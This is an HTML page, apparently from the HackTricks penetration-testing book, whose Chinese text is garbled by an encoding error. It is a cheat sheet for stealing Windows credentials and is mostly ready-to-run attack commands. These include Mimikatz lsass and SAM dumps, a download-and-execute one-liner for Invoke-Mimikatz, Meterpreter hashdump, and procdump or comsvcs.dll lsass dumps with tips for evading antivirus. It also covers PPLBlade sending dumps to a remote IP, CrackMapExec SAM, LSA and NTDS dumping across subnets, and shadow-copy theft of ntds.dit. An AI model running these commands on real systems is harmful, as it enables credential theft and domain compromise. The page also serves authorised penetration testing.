<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stealing Windows Credentials</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="stealing-windows-credentials"><a class="header" href="#stealing-windows-credentials">Stealing Windows Credentials</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="credentials-mimikatz"><a class="header" href="#credentials-mimikatz">Credentials Mimikatz</a></h2>
<pre><code class="language-bash">#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
</code></pre>
<p><strong>åœ¨</strong> <a href="credentials-mimikatz.html"><strong>æ­¤é¡µé¢</strong></a><strong>ä¸­æŸ¥æ‰¾Mimikatzå¯ä»¥åšçš„å…¶ä»–äº‹æƒ…ã€‚</strong></p>
<h3 id="invoke-mimikatz"><a class="header" href="#invoke-mimikatz">Invoke-Mimikatz</a></h3>
<pre><code class="language-bash">IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
</code></pre>
<p><a href="credentials-protections.html"><strong>åœ¨è¿™é‡Œäº†è§£ä¸€äº›å¯èƒ½çš„å‡­æ®ä¿æŠ¤æªæ–½ã€‚</strong></a> <strong>è¿™äº›ä¿æŠ¤æªæ–½å¯ä»¥é˜²æ­¢ Mimikatz æå–æŸäº›å‡­æ®ã€‚</strong></p>
<h2 id="ä½¿ç”¨-meterpreter-çš„å‡­æ®"><a class="header" href="#ä½¿ç”¨-meterpreter-çš„å‡­æ®">ä½¿ç”¨ Meterpreter çš„å‡­æ®</a></h2>
<p>ä½¿ç”¨æˆ‘åˆ›å»ºçš„ <a href="https://github.com/carlospolop/MSF-Credentials"><strong>Credentials Plugin</strong></a> <strong>åœ¨å—å®³è€…å†…éƒ¨æœç´¢å¯†ç å’Œå“ˆå¸Œã€‚</strong></p>
<pre><code class="language-bash">#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
</code></pre>
<h2 id="ç»•è¿‡-av"><a class="header" href="#ç»•è¿‡-av">ç»•è¿‡ AV</a></h2>
<h3 id="procdump--mimikatz"><a class="header" href="#procdump--mimikatz">Procdump + Mimikatz</a></h3>
<p>ç”±äº <strong>Procdump æ¥è‡ª</strong> <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"><strong>SysInternals</strong> </a><strong>æ˜¯ä¸€ä¸ªåˆæ³•çš„ Microsoft å·¥å…·</strong>ï¼Œå› æ­¤ä¸ä¼šè¢« Defender æ£€æµ‹åˆ°ã€‚<br />
æ‚¨å¯ä»¥ä½¿ç”¨æ­¤å·¥å…·æ¥ <strong>è½¬å‚¨ lsass è¿›ç¨‹</strong>ï¼Œ<strong>ä¸‹è½½è½¬å‚¨æ–‡ä»¶</strong>å¹¶ <strong>ä»è½¬å‚¨ä¸­æå–</strong> <strong>å‡­æ®</strong>ã€‚</p>
<p>{% code title="Dump lsass" %}</p>
<pre><code class="language-bash">#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>{% endcode %}</p>
<p>{% code title="ä»è½¬å‚¨ä¸­æå–å‡­æ®" %}</p>
<pre><code class="language-c">//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
</code></pre>
<p>{% endcode %}</p>
<p>æ­¤è¿‡ç¨‹é€šè¿‡ <a href="https://github.com/aas-n/spraykatz">SprayKatz</a> è‡ªåŠ¨å®Œæˆï¼š <code>./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24</code></p>
<p><strong>æ³¨æ„</strong>ï¼šæŸäº› <strong>AV</strong> å¯èƒ½ä¼šå°† <strong>procdump.exe ç”¨äºè½¬å‚¨ lsass.exe</strong> è§†ä¸º <strong>æ¶æ„</strong>ï¼Œè¿™æ˜¯å› ä¸ºå®ƒä»¬æ­£åœ¨ <strong>æ£€æµ‹</strong> å­—ç¬¦ä¸² <strong>"procdump.exe" å’Œ "lsass.exe"</strong>ã€‚å› æ­¤ï¼Œå°† <strong>lsass.exe çš„ PID</strong> ä½œä¸ºå‚æ•°ä¼ é€’ç»™ procdump <strong>è€Œä¸æ˜¯</strong> <strong>lsass.exe çš„åç§°</strong> æ›´åŠ  <strong>éšè”½</strong>ã€‚</p>
<h3 id="ä½¿ç”¨-comsvcsdll-è½¬å‚¨-lsass"><a class="header" href="#ä½¿ç”¨-comsvcsdll-è½¬å‚¨-lsass">ä½¿ç”¨ <strong>comsvcs.dll</strong> è½¬å‚¨ lsass</a></h3>
<p>åä¸º <strong>comsvcs.dll</strong> çš„ DLL ä½äº <code>C:\Windows\System32</code>ï¼Œè´Ÿè´£åœ¨å´©æºƒäº‹ä»¶ä¸­ <strong>è½¬å‚¨è¿›ç¨‹å†…å­˜</strong>ã€‚æ­¤ DLL åŒ…å«ä¸€ä¸ªåä¸º <strong><code>MiniDumpW</code></strong> çš„ <strong>å‡½æ•°</strong>ï¼Œæ—¨åœ¨é€šè¿‡ <code>rundll32.exe</code> è°ƒç”¨ã€‚<br />
ä½¿ç”¨å‰ä¸¤ä¸ªå‚æ•°æ˜¯æ— å…³ç´§è¦çš„ï¼Œä½†ç¬¬ä¸‰ä¸ªå‚æ•°åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ã€‚è¦è½¬å‚¨çš„è¿›ç¨‹ ID æ˜¯ç¬¬ä¸€éƒ¨åˆ†ï¼Œè½¬å‚¨æ–‡ä»¶ä½ç½®æ˜¯ç¬¬äºŒéƒ¨åˆ†ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¸¥æ ¼æ˜¯å•è¯ <strong>full</strong>ã€‚æ²¡æœ‰å…¶ä»–é€‰é¡¹ã€‚<br />
è§£æè¿™ä¸‰ä¸ªéƒ¨åˆ†åï¼ŒDLL å¼€å§‹åˆ›å»ºè½¬å‚¨æ–‡ä»¶å¹¶å°†æŒ‡å®šè¿›ç¨‹çš„å†…å­˜è½¬ç§»åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚<br />
åˆ©ç”¨ <strong>comsvcs.dll</strong> å¯ä»¥è½¬å‚¨ lsass è¿›ç¨‹ï¼Œä»è€Œæ— éœ€ä¸Šä¼ å’Œæ‰§è¡Œ procdumpã€‚æ­¤æ–¹æ³•çš„è¯¦ç»†ä¿¡æ¯å¯åœ¨ <a href="https://en.hackndo.com/remote-lsass-dump-passwords">https://en.hackndo.com/remote-lsass-dump-passwords/</a> ä¸­æ‰¾åˆ°ã€‚</p>
<p>ä»¥ä¸‹å‘½ä»¤ç”¨äºæ‰§è¡Œï¼š</p>
<pre><code class="language-bash">rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
</code></pre>
<p><strong>æ‚¨å¯ä»¥ä½¿ç”¨</strong> <a href="https://github.com/Hackndo/lsassy"><strong>lssasy</strong></a><strong>è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚</strong></p>
<h3 id="ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨è½¬å‚¨-lsass"><a class="header" href="#ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨è½¬å‚¨-lsass"><strong>ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨è½¬å‚¨ lsass</strong></a></h3>
<ol>
<li>å³é”®å•å‡»ä»»åŠ¡æ ï¼Œç„¶åå•å‡»ä»»åŠ¡ç®¡ç†å™¨</li>
<li>å•å‡»æ›´å¤šè¯¦ç»†ä¿¡æ¯</li>
<li>åœ¨è¿›ç¨‹é€‰é¡¹å¡ä¸­æœç´¢â€œæœ¬åœ°å®‰å…¨æˆæƒè¿›ç¨‹â€</li>
<li>å³é”®å•å‡»â€œæœ¬åœ°å®‰å…¨æˆæƒè¿›ç¨‹â€ï¼Œç„¶åå•å‡»â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€ã€‚</li>
</ol>
<h3 id="ä½¿ç”¨-procdump-è½¬å‚¨-lsass"><a class="header" href="#ä½¿ç”¨-procdump-è½¬å‚¨-lsass">ä½¿ç”¨ procdump è½¬å‚¨ lsass</a></h3>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> æ˜¯ä¸€ä¸ªå¾®è½¯ç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ <a href="https://docs.microsoft.com/en-us/sysinternals/">sysinternals</a> å¥—ä»¶çš„ä¸€éƒ¨åˆ†ã€‚</p>
<pre><code>Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
</code></pre>
<h2 id="dumpin-lsass-with-pplblade"><a class="header" href="#dumpin-lsass-with-pplblade">Dumpin lsass with PPLBlade</a></h2>
<p><a href="https://github.com/tastypepperoni/PPLBlade"><strong>PPLBlade</strong></a> æ˜¯ä¸€ä¸ªå—ä¿æŠ¤è¿›ç¨‹è½¬å‚¨å·¥å…·ï¼Œæ”¯æŒå¯¹å†…å­˜è½¬å‚¨è¿›è¡Œæ··æ·†ï¼Œå¹¶åœ¨ä¸å°†å…¶å†™å…¥ç£ç›˜çš„æƒ…å†µä¸‹å°†å…¶ä¼ è¾“åˆ°è¿œç¨‹å·¥ä½œç«™ã€‚</p>
<p><strong>ä¸»è¦åŠŸèƒ½</strong>ï¼š</p>
<ol>
<li>ç»•è¿‡ PPL ä¿æŠ¤</li>
<li>æ··æ·†å†…å­˜è½¬å‚¨æ–‡ä»¶ä»¥è§„é¿ Defender åŸºäºç­¾åçš„æ£€æµ‹æœºåˆ¶</li>
<li>ä½¿ç”¨ RAW å’Œ SMB ä¸Šä¼ æ–¹æ³•ä¸Šä¼ å†…å­˜è½¬å‚¨ï¼Œè€Œä¸å°†å…¶å†™å…¥ç£ç›˜ï¼ˆæ— æ–‡ä»¶è½¬å‚¨ï¼‰</li>
</ol>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
</code></pre>
<p>{% endcode %}</p>
<h2 id="crackmapexec"><a class="header" href="#crackmapexec">CrackMapExec</a></h2>
<h3 id="è½¬å‚¨-sam-å“ˆå¸Œ"><a class="header" href="#è½¬å‚¨-sam-å“ˆå¸Œ">è½¬å‚¨ SAM å“ˆå¸Œ</a></h3>
<pre><code>cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
</code></pre>
<h3 id="è½¬å‚¨-lsa-ç§˜å¯†"><a class="header" href="#è½¬å‚¨-lsa-ç§˜å¯†">è½¬å‚¨ LSA ç§˜å¯†</a></h3>
<pre><code>cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
</code></pre>
<h3 id="ä»ç›®æ ‡-dc-è½¬å‚¨-ntdsdit"><a class="header" href="#ä»ç›®æ ‡-dc-è½¬å‚¨-ntdsdit">ä»ç›®æ ‡ DC è½¬å‚¨ NTDS.dit</a></h3>
<pre><code>cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
</code></pre>
<h3 id="ä»ç›®æ ‡-dc-è½¬å‚¨-ntdsdit-å¯†ç å†å²è®°å½•"><a class="header" href="#ä»ç›®æ ‡-dc-è½¬å‚¨-ntdsdit-å¯†ç å†å²è®°å½•">ä»ç›®æ ‡ DC è½¬å‚¨ NTDS.dit å¯†ç å†å²è®°å½•</a></h3>
<pre><code>#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
</code></pre>
<h3 id="æ˜¾ç¤ºæ¯ä¸ª-ntdsdit-è´¦æˆ·çš„-pwdlastset-å±æ€§"><a class="header" href="#æ˜¾ç¤ºæ¯ä¸ª-ntdsdit-è´¦æˆ·çš„-pwdlastset-å±æ€§">æ˜¾ç¤ºæ¯ä¸ª NTDS.dit è´¦æˆ·çš„ pwdLastSet å±æ€§</a></h3>
<pre><code>#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
</code></pre>
<h2 id="stealing-sam--system"><a class="header" href="#stealing-sam--system">Stealing SAM &amp; SYSTEM</a></h2>
<p>è¿™äº›æ–‡ä»¶åº”è¯¥<strong>ä½äº</strong><em>C:\windows\system32\config\SAM_å’Œ_C:\windows\system32\config\SYSTEM.</em> ä½†æ˜¯<strong>ä½ ä¸èƒ½ä»¥å¸¸è§„æ–¹å¼å¤åˆ¶å®ƒä»¬</strong>ï¼Œå› ä¸ºå®ƒä»¬å—åˆ°ä¿æŠ¤ã€‚</p>
<h3 id="from-registry"><a class="header" href="#from-registry">From Registry</a></h3>
<p>çªƒå–è¿™äº›æ–‡ä»¶çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä»æ³¨å†Œè¡¨è·å–å‰¯æœ¬ï¼š</p>
<pre><code>reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
</code></pre>
<p><strong>ä¸‹è½½</strong>è¿™äº›æ–‡ä»¶åˆ°ä½ çš„Kaliæœºå™¨ï¼Œå¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤<strong>æå–å“ˆå¸Œ</strong>ï¼š</p>
<pre><code>samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
</code></pre>
<h3 id="å·å½±å¤åˆ¶"><a class="header" href="#å·å½±å¤åˆ¶">å·å½±å¤åˆ¶</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ­¤æœåŠ¡å¤åˆ¶å—ä¿æŠ¤çš„æ–‡ä»¶ã€‚æ‚¨éœ€è¦æ˜¯ç®¡ç†å‘˜ã€‚</p>
<h4 id="ä½¿ç”¨-vssadmin"><a class="header" href="#ä½¿ç”¨-vssadmin">ä½¿ç”¨ vssadmin</a></h4>
<p>vssadmin äºŒè¿›åˆ¶æ–‡ä»¶ä»…åœ¨ Windows Server ç‰ˆæœ¬ä¸­å¯ç”¨ã€‚</p>
<pre><code class="language-bash">vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
</code></pre>
<p>ä½†æ˜¯ä½ å¯ä»¥é€šè¿‡ <strong>Powershell</strong> åšåŒæ ·çš„äº‹æƒ…ã€‚è¿™æ˜¯ <strong>å¦‚ä½•å¤åˆ¶ SAM æ–‡ä»¶</strong> çš„ä¸€ä¸ªä¾‹å­ï¼ˆä½¿ç”¨çš„ç¡¬ç›˜æ˜¯ "C:"ï¼Œå¹¶ä¿å­˜åˆ° C:\users\Publicï¼‰ï¼Œä½†ä½ å¯ä»¥ç”¨å®ƒæ¥å¤åˆ¶ä»»ä½•å—ä¿æŠ¤çš„æ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
</code></pre>
<h3 id="invoke-ninjacopy"><a class="header" href="#invoke-ninjacopy">Invoke-NinjaCopy</a></h3>
<p>æœ€åï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1"><strong>PS è„šæœ¬ Invoke-NinjaCopy</strong></a> æ¥å¤åˆ¶ SAMã€SYSTEM å’Œ ntds.ditã€‚</p>
<pre><code class="language-bash">Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
</code></pre>
<h2 id="active-directory-å‡­æ®---ntdsdit"><a class="header" href="#active-directory-å‡­æ®---ntdsdit"><strong>Active Directory å‡­æ® - NTDS.dit</strong></a></h2>
<p><strong>NTDS.dit</strong> æ–‡ä»¶è¢«ç§°ä¸º <strong>Active Directory</strong> çš„æ ¸å¿ƒï¼Œä¿å­˜æœ‰å…³ç”¨æˆ·å¯¹è±¡ã€ç»„åŠå…¶æˆå‘˜èµ„æ ¼çš„é‡è¦æ•°æ®ã€‚å®ƒæ˜¯å­˜å‚¨åŸŸç”¨æˆ·çš„ <strong>å¯†ç å“ˆå¸Œ</strong> çš„åœ°æ–¹ã€‚è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª <strong>å¯æ‰©å±•å­˜å‚¨å¼•æ“ (ESE)</strong> æ•°æ®åº“ï¼Œä½äº <strong><em>%SystemRoom%/NTDS/ntds.dit</em></strong>ã€‚</p>
<p>åœ¨è¿™ä¸ªæ•°æ®åº“ä¸­ï¼Œç»´æŠ¤ç€ä¸‰ä¸ªä¸»è¦è¡¨ï¼š</p>
<ul>
<li><strong>æ•°æ®è¡¨</strong>ï¼šè¯¥è¡¨è´Ÿè´£å­˜å‚¨æœ‰å…³ç”¨æˆ·å’Œç»„ç­‰å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</li>
<li><strong>é“¾æ¥è¡¨</strong>ï¼šå®ƒè·Ÿè¸ªå…³ç³»ï¼Œä¾‹å¦‚ç»„æˆå‘˜èµ„æ ¼ã€‚</li>
<li><strong>SD è¡¨</strong>ï¼šæ¯ä¸ªå¯¹è±¡çš„ <strong>å®‰å…¨æè¿°ç¬¦</strong> å­˜æ”¾åœ¨è¿™é‡Œï¼Œç¡®ä¿å­˜å‚¨å¯¹è±¡çš„å®‰å…¨æ€§å’Œè®¿é—®æ§åˆ¶ã€‚</li>
</ul>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼š<a href="http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/">http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/</a></p>
<p>Windows ä½¿ç”¨ <em>Ntdsa.dll</em> ä¸è¯¥æ–‡ä»¶è¿›è¡Œäº¤äº’ï¼Œå¹¶ç”± <em>lsass.exe</em> ä½¿ç”¨ã€‚ç„¶åï¼Œ<strong>NTDS.dit</strong> æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å¯èƒ½ä½äº <strong><code>lsass</code></strong> å†…å­˜ä¸­ï¼ˆæ‚¨å¯ä»¥æ‰¾åˆ°æœ€è¿‘è®¿é—®çš„æ•°æ®ï¼Œå¯èƒ½æ˜¯ç”±äºä½¿ç”¨ <strong>ç¼“å­˜</strong> æé«˜äº†æ€§èƒ½ï¼‰ã€‚</p>
<h4 id="è§£å¯†-ntdsdit-ä¸­çš„å“ˆå¸Œ"><a class="header" href="#è§£å¯†-ntdsdit-ä¸­çš„å“ˆå¸Œ">è§£å¯† NTDS.dit ä¸­çš„å“ˆå¸Œ</a></h4>
<p>å“ˆå¸Œè¢«åŠ å¯†ä¸‰æ¬¡ï¼š</p>
<ol>
<li>ä½¿ç”¨ <strong>BOOTKEY</strong> å’Œ <strong>RC4</strong> è§£å¯†å¯†ç åŠ å¯†å¯†é’¥ (<strong>PEK</strong>)ã€‚</li>
<li>ä½¿ç”¨ <strong>PEK</strong> å’Œ <strong>RC4</strong> è§£å¯† <strong>å“ˆå¸Œ</strong>ã€‚</li>
<li>ä½¿ç”¨ <strong>DES</strong> è§£å¯† <strong>å“ˆå¸Œ</strong>ã€‚</li>
</ol>
<p><strong>PEK</strong> åœ¨ <strong>æ¯ä¸ªåŸŸæ§åˆ¶å™¨</strong> ä¸­å…·æœ‰ <strong>ç›¸åŒçš„å€¼</strong>ï¼Œä½†å®ƒåœ¨ <strong>NTDS.dit</strong> æ–‡ä»¶ä¸­ä½¿ç”¨ <strong>åŸŸæ§åˆ¶å™¨çš„ SYSTEM æ–‡ä»¶çš„ BOOTKEY</strong> è¿›è¡Œ <strong>åŠ å¯†</strong>ï¼ˆåœ¨ä¸åŒçš„åŸŸæ§åˆ¶å™¨ä¹‹é—´æ˜¯ä¸åŒçš„ï¼‰ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ä» NTDS.dit æ–‡ä»¶ä¸­è·å–å‡­æ® <strong>æ‚¨éœ€è¦ NTDS.dit å’Œ SYSTEM æ–‡ä»¶</strong> (<em>C:\Windows\System32\config\SYSTEM</em>)ã€‚</p>
<h3 id="ä½¿ç”¨-ntdsutil-å¤åˆ¶-ntdsdit"><a class="header" href="#ä½¿ç”¨-ntdsutil-å¤åˆ¶-ntdsdit">ä½¿ç”¨ Ntdsutil å¤åˆ¶ NTDS.dit</a></h3>
<p>è‡ª Windows Server 2008 èµ·å¯ç”¨ã€‚</p>
<pre><code class="language-bash">ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
</code></pre>
